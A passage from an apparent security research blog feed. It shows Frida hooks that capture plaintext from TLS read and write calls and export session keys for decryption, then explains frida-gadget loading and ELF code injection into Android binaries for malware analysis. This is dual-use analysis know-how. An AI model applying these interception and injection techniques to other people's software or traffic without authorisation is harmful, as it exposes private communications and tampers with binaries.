&lt;p>For friTap, the second parameter, the buffer containing the unencrypted data, is the important one. To read the contents of this buffer, friTap needs the pointer to it and the number of bytes that were received.
FRIDA&amp;rsquo;s interceptor allows to define hooks for function start and end. These callbacks are executed before the execution and after the execution of the function.
The callback function for the hook of the function start is passed all parameters of the hooked function. Thus the callback function is able to extract and manipulate all passed parameters.
friTap takes advantage of this and extracts from the parameters the second pointer of the read function, which points to the buffer that holds the received, unencrypted data. The implementation is here as an example (using OpenSSL) for the other implementations and it looks like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#a6e22e">Interceptor&lt;/span>.&lt;span style="color:#a6e22e">attach&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_read&amp;#34;&lt;/span>],
{
&lt;span style="color:#a6e22e">onEnter&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">any&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getPortsAndAddresses&lt;/span>(&lt;span style="color:#a6e22e">SSL_get_fd&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]) &lt;span style="color:#a6e22e">as&lt;/span> &lt;span style="color:#a6e22e">number&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>, &lt;span style="color:#a6e22e">addresses&lt;/span>)
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;ssl_session_id&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getSslSessionId&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>])
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;function&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;SSL_read&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">message&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">buf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>]
}
...
})
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The pointer to the buffer is in the paramter array named &lt;code>args&lt;/code>, strictly speaking in the second position (it is the second function parameter). This is now saved in the execution context using &lt;code>this.buf = args[1]&lt;/code>, since the buffer will only be filled with the received data after the read function has been executed.&lt;/p>
&lt;p>The hook of the function end has exactly one parameter, the return value of the function. In the case of the read function, this is the number of bytes received, which is important for reading the buffer. The hook for the end of the function looks like the following, again demonstrated with OpenSSL as an example:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#a6e22e">Interceptor&lt;/span>.&lt;span style="color:#a6e22e">attach&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_read&amp;#34;&lt;/span>],
{
...
&lt;span style="color:#a6e22e">onLeave&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">retval&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">any&lt;/span>) {
&lt;span style="color:#a6e22e">retval&lt;/span> &lt;span style="color:#f92672">|=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e">// Cast retval to 32-bit integer.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">retval&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;span style="color:#66d9ef">return&lt;/span>
}
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">buffer_content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">buf&lt;/span>.&lt;span style="color:#a6e22e">readByteArray&lt;/span>(&lt;span style="color:#a6e22e">retval&lt;/span>)
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;contentType&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;datalog&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">message&lt;/span>, &lt;span style="color:#a6e22e">buffer_content&lt;/span>)
}
})
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>retval&lt;/code> is the return value of the read function, i.e. the number of bytes received. The previously saved pointer to the buffer can now be read with &lt;code>readByteArray()&lt;/code>. By the return value of the read function friTap knows exactly how many bytes have to be read from the buffer. The extracted bytes are then stored in a dictionary object, which in addition to the data also contains information such as port numbers, sender and receiver addresses, etc. . This is then sent via &lt;code>send()&lt;/code> from the target process to the main script (&lt;a href="https://github.com/fkie-cad/friTap/blob/9ba62ad1aecffb3baed812690b74efe99d970d22/friTap.py">python script&lt;/a>), which then processes this information.&lt;/p>
&lt;h3 id="hooking-the-write-function">Hooking the write function&lt;/h3>
&lt;p>As with the read functions, the write functions have the same function signature for all libraries supported by friTap:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The first parameter is a pointer to an SSL object that holds all information about the SSL session being used in the background. This object is used to identify the SSL/TLS stream over which data is sent.
The second parameter is a pointer to a buffer that holds the data to be transmitted, in unencrypted form.
The third parameter specifies how many bytes from the referenced buffer should be sent over the associated SSL/TLS stream.&lt;/p>
&lt;p>Unlike the read function, all information necessary for friTap is already available before function execution. The implementation is again exemplified with the implementation of OpenSSL:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#a6e22e">Interceptor&lt;/span>.&lt;span style="color:#a6e22e">attach&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_write&amp;#34;&lt;/span>],
{
&lt;span style="color:#a6e22e">onEnter&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">any&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getPortsAndAddresses&lt;/span>(&lt;span style="color:#a6e22e">SSL_get_fd&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]) &lt;span style="color:#a6e22e">as&lt;/span> &lt;span style="color:#a6e22e">number&lt;/span>, &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#a6e22e">addresses&lt;/span>)
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;ssl_session_id&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getSslSessionId&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>])
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;function&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;SSL_write&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;contentType&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;datalog&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">bytesToBeSent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>].&lt;span style="color:#a6e22e">readByteArray&lt;/span>(parseInt(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]))
&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">message&lt;/span>, &lt;span style="color:#a6e22e">bytesToBeSent&lt;/span>)
}
})
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>args[1]&lt;/code> is the pointer to the buffer, &lt;code>args[2]&lt;/code> the number of bytes to send. With &lt;code>readByteArray()&lt;/code> the bytes to send can be copied from the buffer. The extracted bytes are then stored in a dictionary object, which contains besides the data also information like port numbers, sender and receiver address etc.. This is then sent via &lt;code>send()&lt;/code> from the target process to the main script (Python script), which then processes this information.&lt;/p>
&lt;h3 id="key-extraction">Key extraction&lt;/h3>
&lt;p>In addition to hooking the read and write functions, friTap also provides the ability to export all keys created/received during the handshake. These keys can then be used to decrypt encrypted TLS traffic. Wirehsark provides the ability to specify a keylog file that friTap created when the client connected to the server.
The implementation of this functionality varies widely. This is due to the default behavior of the individual libraries, especially depending on the operating system.&lt;/p>
&lt;p>Again, we would like to show an example, based on the implementation of OpenSSL on linux:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">SSL_CTX_set_keylog_callback&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ObjC&lt;/span>.&lt;span style="color:#a6e22e">available&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">NativeFunction&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_CTX_set_info_callback&amp;#34;&lt;/span>], &lt;span style="color:#e6db74">&amp;#34;void&amp;#34;&lt;/span>, [&lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">NativeFunction&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_CTX_set_keylog_callback&amp;#34;&lt;/span>], &lt;span style="color:#e6db74">&amp;#34;void&amp;#34;&lt;/span>, [&lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>])
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">keylog_callback&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">NativeCallback&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">ctxPtr&lt;/span>, &lt;span style="color:#a6e22e">linePtr&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">NativePointer&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">number&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> } &lt;span style="color:#f92672">=&lt;/span> {}
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;contentType&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;keylog&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;keylog&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">linePtr&lt;/span>.&lt;span style="color:#a6e22e">readCString&lt;/span>()
&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">message&lt;/span>)
}, &lt;span style="color:#e6db74">&amp;#34;void&amp;#34;&lt;/span>, [&lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>])
&lt;/code>&lt;/pre>&lt;/div>&lt;p>If OpenSSL is selected as a dynamically loaded library, many functions are exported by default. Fortunately, the function &lt;code>SSL_CTX_set_keylog_callback&lt;/code> (linux desktop) is also exported. This function gives the user the ability to define a callback function that will be called whenever new key material is generated or received. This function is passed two parameters when it is called: An SSL object associated with the connection and the newly generated or received key material in the form of a string. FRIDA allows you to define your own callback functions, which we did for this use case. friTap creates a new callback function that reads the passed string and stores it in a dictionary object, which is sent to the main script (python script) and processed by it (log or write out).&lt;/p>
&lt;p>In order to register the own callback, the function &lt;code>SSL_CTX_set_keylog_callback&lt;/code> must be called once, before the handshake, with the callback function as parameter. friTap hooks the &lt;code>SSL_new&lt;/code> method for this. This function is called before the handshake, but also after the SSL context has been created, i.e. the binding options have already been set so that the callback function can receive the key material of the subsequent handshake.&lt;/p>
&lt;p>For each operating system, friTap knows the usual library/module and the function that is ultimately responsible for loading the new library. When a new library is loaded into program memory, the name of the new module is checked to see if it matches any of the SSL/TLS library names. If this is the case, the usual read, write and key export functions are hooked.&lt;/p>
&lt;h2 id="special-thanks">Special Thanks&lt;/h2>
&lt;p>We like to thank our colleague Max J. Ufer for his initial work in creating friTap. Further we like to thank Martin Lambertz and Jan-Niclas Hilgert for their feedback while working on friTap. Finally we have to thank Ole André Vadla Ravnås for his tireless efforts in the development of FRIDA.&lt;/p>
&lt;h2 id="getting-started">Getting started&lt;/h2>
&lt;p>friTap can be downloaded here: &lt;a href="https://github.com/fkie-cad/friTap">https://github.com/fkie-cad/friTap&lt;/a>&lt;/p></content></item><item><title>Make Frida Great Again</title><link>https://lolcads.github.io/posts/2022/07/make_frida_great_again/</link><pubDate>Thu, 28 Jul 2022 13:29:30 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/07/make_frida_great_again/</guid><description>Make Frida Great Again In order to analyse binaries on e.g. Android systems, one is offered a plethora of tools to use to figure out what a binary is doing, whether it is malicious or just buggy. One way to figure out the behaviour of a binary is to utilise the strength of dynamic analysis. Under linux, i.e. Android in particular, Frida is a tool that is used for automated instrumentation of binaries, to inspect memory, function calls etc.</description><content>&lt;h1 id="make-frida-great-again">Make Frida Great Again&lt;/h1>
&lt;p>In order to analyse binaries on e.g. Android systems, one is offered a plethora of tools to use to figure out what a binary is doing, whether it is malicious or just buggy. One way to figure out the behaviour of a binary is to utilise the strength of dynamic analysis. Under linux, i.e. Android in particular, &lt;a href="https://frida.re">Frida&lt;/a> is a tool that is used for automated instrumentation of binaries, to inspect memory, function calls etc.&lt;/p>
&lt;p>In this blog post, I will describe how to overcome a main issue of Frida such that Frida is applicable to a broader set of binaries. For that I will give in-depth explanations on the different techniques being used to solve the issue. Also I will showcase the use of a &lt;a href="https://github.com/fkie-cad/ELFbin">python library&lt;/a> that emerged as a result of this issue.&lt;/p>
&lt;h2 id="stumbling-frida---the-issue">Stumbling Frida - The Issue&lt;/h2>
&lt;p>Frida internally uses the &lt;a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">&lt;code>ptrace&lt;/code>&lt;/a> - syscall to attach to running processes. Notice that using &lt;code>ptrace&lt;/code> requires the &lt;code>CAP_SYS_PTRACE&lt;/code> - capability, which is a requirement for tracing arbitrary processes. Thus, an unprivileged user cannot trace e.g. a privileged process. An example is tracing a process on an Android device. If this device is not rooted, then it will not be possible to use &lt;code>ptrace&lt;/code> on arbitrary processes.&lt;/p>
&lt;p>Lets assume that a user is capable of using &lt;code>ptrace&lt;/code> and that user wants to analyse a potentially malicious binary that employs anti-debugging techniques like the following one&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">if&lt;/span> (ptrace(PTRACE_TRACEME, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;span style="color:#75715e">// traced: nice behaviour
&lt;/span>&lt;span style="color:#75715e">&lt;/span>} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;span style="color:#75715e">// not traced: evil behaviour
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then Frida can again not be used to analyse all functionality of the process. This is due to the fact that for each tracee there may at most be one tracer.&lt;/p>
&lt;h2 id="frida-gadget">Frida Gadget&lt;/h2>
&lt;p>Of course the developers of Frida are well aware of this issue. Therefore they provide a shared object file called &lt;a href="https://frida.re/docs/gadget/">&lt;em>frida-gadget.so&lt;/em>&lt;/a>(downloaded &lt;a href="https://github.com/frida/frida/releases">here&lt;/a>), which is to be injected manually into the target process. There are different kinds of interaction types that specify how the connection between the &lt;em>frida server&lt;/em> and the &lt;em>frida client&lt;/em> is set up.&lt;/p>
&lt;p>In the following you can see an example of how to use &lt;em>frida-gadget.so&lt;/em> with its default interaction type &lt;em>listen&lt;/em>. First, for the target binary:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>/path/to/frida-gadget.so /path/to/target
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, in order to e.g. trace syscalls that start with &amp;ldquo;read&amp;rdquo;:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">frida-trace -H 127.0.0.1:27042 -n &lt;span style="color:#e6db74">&amp;#34;Gadget&amp;#34;&lt;/span> -i &lt;span style="color:#e6db74">&amp;#34;read*&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>-H 127.0.0.1:27042: Specifies the frida server to connect to. In this case the server is located on localhost on the default port 27042.&lt;/li>
&lt;li>-n &amp;ldquo;Gadget&amp;rdquo;: Name of the process to attach to. &lt;strong>In this setting, the name of the target process will always be &amp;ldquo;Gadget&amp;rdquo;!&lt;/strong>&lt;/li>
&lt;li>-i &amp;ldquo;read*&amp;quot;: Specifies what function(s) to trace.&lt;/li>
&lt;/ul>
&lt;p>Using &lt;code>LD_PRELOAD&lt;/code> is not practical in all cases as e.g. it cannot be used to instrument an SUID - binary. For a more general solution, we need another approach.&lt;/p>
&lt;h2 id="elf---based-injection">ELF - based Injection&lt;/h2>
&lt;p>The approach used to make a process load &lt;em>frida-gadget.so&lt;/em> at startup is ELF - based injection. In order to support as many platforms as possible, those injection techniques will be based on &lt;a href="http://www.sco.com/developers/gabi/latest/contents.html">System V gABI&lt;/a>. It describes the abstract structure of an ELF - file, occasionally leaving out details to be specified by a corresponding &lt;em>Processor Supplement&lt;/em> (e.g. &lt;a href="https://github.com/ARM-software/abi-aa/releases/download/2022Q1/aaelf64.pdf">ARM64&lt;/a> or &lt;a href="https://gitlab.com/x86-psABIs/x86-64-ABI">AMD64&lt;/a>).&lt;/p>
&lt;p>Unfortunately, it is &lt;strong>not&lt;/strong> possible to fully implement ELF - based injection without using architecture - or OS - dependent information. Thus, the following platform-specific assumptions were made when designing the techniques:&lt;/p>
&lt;ol>
&lt;li>ELF - binary is run on ARM64 and Android: This must currently be ensured, because adjusting virtual addresses and file offsets in the binary enforces patching &lt;a href="http://www.sco.com/developers/gabi/latest/ch4.reloc.html">&lt;em>Relocation Tables&lt;/em>&lt;/a>, which are highly platform - dependent.&lt;/li>
&lt;li>There are no other platform - specific tags for &lt;em>.dynamic&lt;/em> - entries other than&lt;/li>
&lt;li>DT_VERSYM&lt;/li>
&lt;li>DT_VERDEF&lt;/li>
&lt;li>DT_VERNEED&lt;/li>
&lt;li>One of the parsers (see &lt;a href="#rule-of-two">Rule of Two&lt;/a>) is build for AMD64 only. Thus the python library will only work on AMD64. Technically, one can try to make sense of the makefiles and change the compilation such that it supports other architectures aswell.&lt;/li>
&lt;/ol>
&lt;p>ELF - based injection can be split into two (or more) steps:&lt;/p>
&lt;ol>
&lt;li>Code injection: Insert code into binary, i.e. make it available for internal structures.&lt;/li>
&lt;li>Code execution: Make injected code executable, i.e. manipulate structures like entry point such that the injected code will be part of the control flow.&lt;/li>
&lt;/ol>
&lt;p>There is one special technique that cannot be split into two parts: &lt;em>.dynamic&lt;/em> - based injection.&lt;/p>
&lt;h3 id="rule-of-two">Rule of Two&lt;/h3>
&lt;p>The techniques to be explained are implemented in a &lt;a href="https://github.com/fkie-cad/ELFbin">python library&lt;/a>, which mainly uses &lt;a href="https://github.com/lief-project/LIEF">LIEF&lt;/a>. LIEF is a binary parser that among other things supports parsing and manipulating ELF - files. However there is a problem with LIEF, i.e. LIEF desperately tries to keep the binary intact. For that LIEF inserts new memory, shuffles segments around and maybe more when just opening and closing the binary. E.g.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">binary &lt;span style="color:#f92672">=&lt;/span> lief&lt;span style="color:#f92672">.&lt;/span>parse(&lt;span style="color:#e6db74">&amp;#39;/bin/ls&amp;#39;&lt;/span>)
binary&lt;span style="color:#f92672">.&lt;/span>write(&lt;span style="color:#e6db74">&amp;#39;./tmp&amp;#39;&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>will &amp;ldquo;build&amp;rdquo; the binary, i.e. internally calling&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">builder &lt;span style="color:#f92672">=&lt;/span> lief&lt;span style="color:#f92672">.&lt;/span>ELF&lt;span style="color:#f92672">.&lt;/span>Builder(binary)
builder&lt;span style="color:#f92672">.&lt;/span>build()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>which will insert memory (out of nowhere). One could make the hypothesis that LIEF wants to &amp;ldquo;prepare&amp;rdquo; the binary for future manipulation and thus already allocates enough space to support e.g. quick PHT injections.&lt;/p>
&lt;p>Also LIEF does not provide all necessary functionality to implement the techniques described in this post. E.g. LIEF does not support overwriting a PHT - entry without modifying the linked memory.&lt;/p>
&lt;p>To that end, a custom parser is utilised. It supports all necessary functionality that LIEF is lacking or not willing to provide, because it might break correctness. The custom parser, &lt;code>rawelf_injection&lt;/code>, takes the name of a binary as an input and performs the requested operations.&lt;/p>
&lt;p>An issue is that when calling &lt;code>rawelf_injection&lt;/code>, LIEF needs to store the current state of the binary to a temporary file and reparse that file after &lt;code>rawelf_injection&lt;/code> is done. This will result in references to objects, that are related to the state of a LIEF - binary &lt;strong>before&lt;/strong> storing the binary to a file, being invalid after LIEF reparsed the binary.&lt;/p>
&lt;p>Other problems emerging from using two parsers at the same time will be mentioned throughout the following sections.&lt;/p>
&lt;h3 id="code-injection">Code Injection&lt;/h3>
&lt;p>Inserting code into the binary can be as easy as just overwriting existing code in &lt;em>.text&lt;/em> and as hard as inserting a new segment and a corresponding PHT - entry. Interestingly, not all of the following techniques are applicable in a fixed setting, thus the user of &lt;code>ElfInjection&lt;/code> has to know what he/she is doing when performing code injection.&lt;/p>
&lt;p>As &lt;code>rawelf_injection&lt;/code> has been designed w.r.t. the System V gABI, applying it to ELF - files constructed for Android on AARCH64 was assumed to work just out-of-the-box (except for relocations). &lt;code>rawelf_injection&lt;/code> has only been tested on Ubuntu 20.04 LTS on AMD64 up to the date I started applying the techniques to ELF - files run on an Android emulator. Lets first look at an overview of the challenges I experienced before diving into the details:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/07/arm_vs_amd.png" alt="Challenges introduced by new platform">&lt;/p>
&lt;p>Unfortunately, it turns out that &lt;code>rawelf_injection&lt;/code> does not support platform - independent injection techniques, as OS vendors apparently are allowed to deviate partially from the System V gABI. On the other hand, for different architectures, there are different CPU instructions, like e.g. &lt;code>adrp&lt;/code>, that introduce unwanted side effects when inserting new memory.&lt;/p>
&lt;p>So lets list the challenges and then try to solve them:&lt;/p>
&lt;ol>
&lt;li>Inserting new memory into a binary can invalidate cross - references (e.g. &lt;code>adrp&lt;/code>).&lt;/li>
&lt;li>Loadable segments should not overlap (see &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_phdr.cpp;l=80">linker_phdr.cpp&lt;/a> ; user has to ensure that loadables do not overlap)&lt;/li>
&lt;li>Platform - specific ELF patches (adjust &lt;code>rawelf_injection&lt;/code> to AARCH64 processor supplement)&lt;/li>
&lt;li>Dynamic linker (see &lt;a href="#dynsym---based-injection">.dynsym - based injection&lt;/a> for details)&lt;/li>
&lt;/ol>
&lt;h4 id="problem-with-adrp">Problem with &lt;code>adrp&lt;/code>&lt;/h4>
&lt;p>Lets assume we want to inject code into an ARM64 - PIE on Android (API level 31, Pixel 3). Then, using NDK r23b&amp;rsquo;s toolchain (i.e. &lt;code>ndk-build&lt;/code>) to compile the program&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">ì&lt;/span>nt &lt;span style="color:#a6e22e">main&lt;/span>() {
puts(&lt;span style="color:#e6db74">&amp;#34;Hello World!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>there will be at least one &lt;em>.plt&lt;/em> - entry that handles all calls to &lt;code>puts&lt;/code>. The corresponding &lt;em>.plt&lt;/em> - stub may look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ aarch64-linux-gnu-objdump -j .plt -d hello
...
00000000000006a0 &amp;lt;__libc_init@plt-0x20&amp;gt;:
6a0: a9bf7bf0 stp x16, x30, &lt;span style="color:#f92672">[&lt;/span>sp, &lt;span style="color:#75715e">#-16]!&lt;/span>
6a4: b0000010 adrp x16, &lt;span style="color:#ae81ff">1000&lt;/span> &amp;lt;puts@plt+0x920&amp;gt;
6a8: f944a211 ldr x17, &lt;span style="color:#f92672">[&lt;/span>x16, &lt;span style="color:#75715e">#2368]&lt;/span>
6ac: &lt;span style="color:#ae81ff">91250210&lt;/span> add x16, x16, &lt;span style="color:#75715e">#0x940&lt;/span>
6b0: d61f0220 br x17
...
00000000000006e0 &amp;lt;puts@plt&amp;gt;:
6e0: b0000010 adrp x16, &lt;span style="color:#ae81ff">1000&lt;/span> &amp;lt;puts@plt+0x920&amp;gt;
